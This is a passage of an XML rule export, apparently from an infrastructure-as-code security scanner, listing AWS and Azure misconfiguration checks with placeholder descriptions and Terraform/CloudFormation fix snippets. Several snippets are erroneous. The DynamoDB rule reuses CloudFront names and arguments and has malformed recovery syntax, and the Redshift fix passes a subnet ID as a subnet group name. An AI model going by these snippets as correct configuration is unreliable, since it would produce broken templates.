<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_redshift_cluster</li>
<li><strong>Argument:</strong> cluster_subnet_group_name</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_redshift_cluster" "pass" {
    ...
+ cluster_subnet_group_name="subnet-ebd9cead"
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::Redshift::Cluster</li>
<li><strong>Argument:</strong> Properties.ClusterSubnetGroupName</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: "AWS::Redshift::Cluster"
  Properties:
    ...
+   ClusterSubnetGroupName: "subnet-ebd9cead"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-redshift-is-not-deployed-outside-of-a-vpc' target='_blank'> https://docs.bridgecrew.io/docs/ensure-redshift-is-not-deployed-outside-of-a-vpc</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-redshift-is-not-deployed-outside-of-a-vpc' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_155</key>
    <name>Ensure that Workspace user volumes are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="workspace-user-volumes-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-workspace-user-volumes-are-not-encrypted"></div>Workspace user volumes are not encrypted</div><a aria-label="Skip link to Workspace user volumes are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#workspace-user-volumes-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_workspaces_workspace</li>
<li><strong>Argument</strong>:  user_volume_encryption_enabled, volume_encryption_key</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_workspaces_workspace" "pass" {
    ...
+ user_volume_encryption_enabled = true
+ volume_encryption_key          = var.volume_encryption_key
    ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::WorkSpaces::Workspace</li>
<li><strong>Argument</strong>:  Properties.UserVolumeEncryptionEnabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::WorkSpaces::Workspace
    Properties: 
      ...
+     UserVolumeEncryptionEnabled: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-workspace-user-volumes-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-workspace-user-volumes-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-workspace-user-volumes-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_161</key>
    <name>Ensure RDS database has IAM authentication enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rds-database-does-not-have-iam-authentication-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rds-database-does-not-have-iam-authentication-enabled"></div>RDS database does not have IAM authentication enabled</div><a aria-label="Skip link to RDS database does not have IAM authentication enabled" class="heading-anchor-icon fa fa-anchor" href="#rds-database-does-not-have-iam-authentication-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> "aws_db_instance</li>
<li><strong>Argument:</strong> iam_database_authentication_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_db_instance" "test" {
    ...
+ iam_database_authentication_enabled = true
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> "AWS::RDS::DBInstance</li>
<li><strong>Argument:</strong> Properties.EnableIAMDatabaseAuthentication</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  DB:
    Type: 'AWS::RDS::DBInstance'
    Properties:
      Engine: 'mysql' # or 'postgres'
      ...
+     EnableIAMDatabaseAuthentication: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-rds-database-has-iam-authentication-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-rds-database-has-iam-authentication-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-rds-database-has-iam-authentication-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_162</key>
    <name>Ensure RDS cluster has IAM authentication enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rds-cluster-does-not-have-iam-authentication-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rds-cluster-does-not-have-iam-authentication-enabled"></div>RDS cluster does not have IAM authentication enabled</div><a aria-label="Skip link to RDS cluster does not have IAM authentication enabled" class="heading-anchor-icon fa fa-anchor" href="#rds-cluster-does-not-have-iam-authentication-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_rds_cluster</li>
<li><strong>Argument:</strong> iam_database_authentication_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_rds_cluster" "enabled" {
    ...
+ iam_database_authentication_enabled = true
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::RDS::DBCluster</li>
<li><strong>Argument:</strong> Properties.EnableIAMDatabaseAuthentication</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Enabled:
    Type: 'AWS::RDS::DBCluster'
    Properties:
      ...
+     EnableIAMDatabaseAuthentication: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-rds-cluster-has-iam-authentication-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-rds-cluster-has-iam-authentication-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-rds-cluster-has-iam-authentication-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_164</key>
    <name>Ensure Transfer Server is not exposed publicly</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="transfer-server-is-publicly--exposed"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-transfer-server-is-publicly-exposed"></div>Transfer Server is publicly  exposed</div><a aria-label="Skip link to Transfer Server is publicly  exposed" class="heading-anchor-icon fa fa-anchor" href="#transfer-server-is-publicly--exposed"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_transfer_server</li>
<li><strong>Argument:</strong> endpoint_type</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_transfer_server" "test" {
  + endpoint_type = "VPC"
    protocols   = ["SFTP"]
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::Transfer::Server</li>
<li><strong>Argument:</strong> Properties.EndpointType</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources: 
  VPC:
    Type: AWS::Transfer::Server
    Properties: 
        ...
+     EndpointType: "VPC" # or "VPC_ENDPOINT"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-transfer-server-is-not-exposed-publicly' target='_blank'> https://docs.bridgecrew.io/docs/ensure-transfer-server-is-not-exposed-publicly</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-transfer-server-is-not-exposed-publicly' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_165</key>
    <name>Ensure Dynamodb point in time recovery is enabled for global tables</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="dynamodb-point-in-time-recovery-is-not-enabled-for-global-tables"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-dynamodb-point-in-time-recovery-is-not-enabled-for-global-tables"></div>Dynamodb point in time recovery is not enabled for global tables</div><a aria-label="Skip link to Dynamodb point in time recovery is not enabled for global tables" class="heading-anchor-icon fa fa-anchor" href="#dynamodb-point-in-time-recovery-is-not-enabled-for-global-tables"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong>  AWS::DynamoDB::GlobalTable</li>
<li><strong>Argument:</strong> Properties.DistributionConfig.Logging/Bucket</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  MyCloudFrontDistribution:
    Type: AWS::DynamoDB::GlobalTable
    Properties: 
            ...
      Replicas: 
+       - PointInTimeRecoverySpecification: 
+           - PointInTimeRecoveryEnabled
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-dynamodb-point-in-time-recovery-is-enabled-for-global-tables' target='_blank'> https://docs.bridgecrew.io/docs/ensure-dynamodb-point-in-time-recovery-is-enabled-for-global-tables</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-dynamodb-point-in-time-recovery-is-enabled-for-global-tables' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_166</key>
    <name>Ensure Backup Vault is encrypted at rest using KMS CMK</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="backup-vault-is-not-encrypted-at-rest-using-kms-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-backup-vault-is-not-encrypted-at-rest-using-kms-cmk"></div>Backup Vault is not encrypted at rest using KMS CMK</div><a aria-label="Skip link to Backup Vault is not encrypted at rest using KMS CMK" class="heading-anchor-icon fa fa-anchor" href="#backup-vault-is-not-encrypted-at-rest-using-kms-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_backup_vault</li>
<li><strong>Argument</strong>:  kms_key_arn</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_backup_vault" "backup_with_kms_key" {
    ...
  + kms_key_arn = aws_kms_key.example.arn
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::Backup::BackupVault</li>
<li><strong>Argument</strong>:  Properties.EncryptionKeyArn</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::Backup::BackupVault
    Properties:
      ...
+     EncryptionKeyArn: example.arn/aws_kms_key
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-backup-vault-is-encrypted-at-rest-using-kms-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-backup-vault-is-encrypted-at-rest-using-kms-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-backup-vault-is-encrypted-at-rest-using-kms-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_167</key>
    <name>Ensure Glacier Vault access policy is not public by only allowing specific services or principals to access it</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="glacier-vault-access-policy-is-public-and-not-restricted-to-specific-services-or-principals"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-glacier-vault-access-policy-is-public-and-not-restricted-to-specific-services-or-principals"></div>Glacier Vault access policy is public and not restricted to specific services or principals</div><a aria-label="Skip link to Glacier Vault access policy is public and not restricted to specific services or principals" class="heading-anchor-icon fa fa-anchor" href="#glacier-vault-access-policy-is-public-and-not-restricted-to-specific-services-or-principals"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_glacier_vault</li>
<li><strong>Argument</strong>:  Statement</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_glacier_vault" "my_archive1" {
  ...
  access_policy = &lt;&lt;EOF
{
    "Version":"2012-10-17",
    "Statement":[
       {
          "Sid": "add-read-only-perm",
          "Principal": "*",
       +  "Effect": "Deny",
          "Action": [
             "glacier:InitiateJob",
             "glacier:GetJobOutput"
          ],
          "Resource": "arn:aws:glacier:eu-west-1:432981146916:vaults/MyArchive"
       }
    ]
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-glacier-vault-access-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it' target='_blank'> https://docs.bridgecrew.io/docs/ensure-glacier-vault-access-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-glacier-vault-access-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_168</key>
    <name>Ensure SQS queue policy is not public by only allowing specific services or principals to access it</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="sqs-queue-policy-is-public-and-access-is-not-restricted-to-specific-services-or-principals"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-sqs-queue-policy-is-public-and-access-is-not-restricted-to-specific-services-or-principals"></div>SQS queue policy is public and access is not restricted to specific services or principals</div><a aria-label="Skip link to SQS queue policy is public and access is not restricted to specific services or principals" class="heading-anchor-icon fa fa-anchor" href="#sqs-queue-policy-is-public-and-access-is-not-restricted-to-specific-services-or-principals"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_sqs_queue_policy</li>
<li><strong>Argument</strong>:  Statement</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_sqs_queue_policy" "test" {
  ... 
  policy = &lt;&lt;POLICY
{
    "Version":"2012-10-17",
    "Statement":[
       {
          "Principal": "*",
+         "Effect": "Deny",
          "Action": "sqs:SendMessage",
          "Resource": "${aws_sqs_queue_policy.q.arn}"
       }
    ]
}
POLICY
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-sqs-queue-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it' target='_blank'> https://docs.bridgecrew.io/docs/ensure-sqs-queue-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-sqs-queue-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_54</key>
    <name>Ensure MySQL is using the latest version of TLS encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="mysql-is-not-using-the-latest-version-of-tls-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-my-sql-is-not-using-the-latest-version-of-tls-encryption"></div>MySQL is not using the latest version of TLS encryption</div><a aria-label="Skip link to MySQL is not using the latest version of TLS encryption" class="heading-anchor-icon fa fa-anchor" href="#mysql-is-not-using-the-latest-version-of-tls-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all your MySQL servers.</p>
